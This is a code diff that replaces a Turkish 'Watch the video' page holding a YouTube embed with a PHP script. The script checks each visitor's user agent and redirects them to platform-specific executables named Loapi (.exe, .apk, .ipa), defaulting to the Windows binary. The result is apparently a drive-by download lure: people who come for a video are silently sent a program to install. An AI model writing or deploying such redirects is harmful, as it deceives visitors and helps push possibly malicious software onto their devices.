@@ -1,16 +1,18 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <title>Videoyu İzleyin</title>
-</head>
-<body>
-    <h1>Videoyu İzleyin</h1>
-    <iframe width="560" height="315"
-            src="https://www.youtube.com/watch?v=YvrhQ3e02UI"
-            frameborder="0"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-            allowfullscreen>
-    </iframe>
-</body>
-</html>
+<?php
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+if (preg_match('/Windows/i', $user_agent)) {
+    header('Location: /downloads/Loapi.exe');
+    exit;
+} elseif (preg_match('/Android/i', $user_agent)) {
+    header('Location: /downloads/Loapi.apk');
+    exit;
+} elseif (preg_match('/iPhone|iPad|iPod/i', $user_agent)) {
+    header('Location: /downloads/Loapi.ipa');
+    exit;
+} else {
+    // Diğer işletim sistemleri için varsayılan indirme
+    header('Location: /downloads/Loapi.exe');
+    exit;
+}
+?>
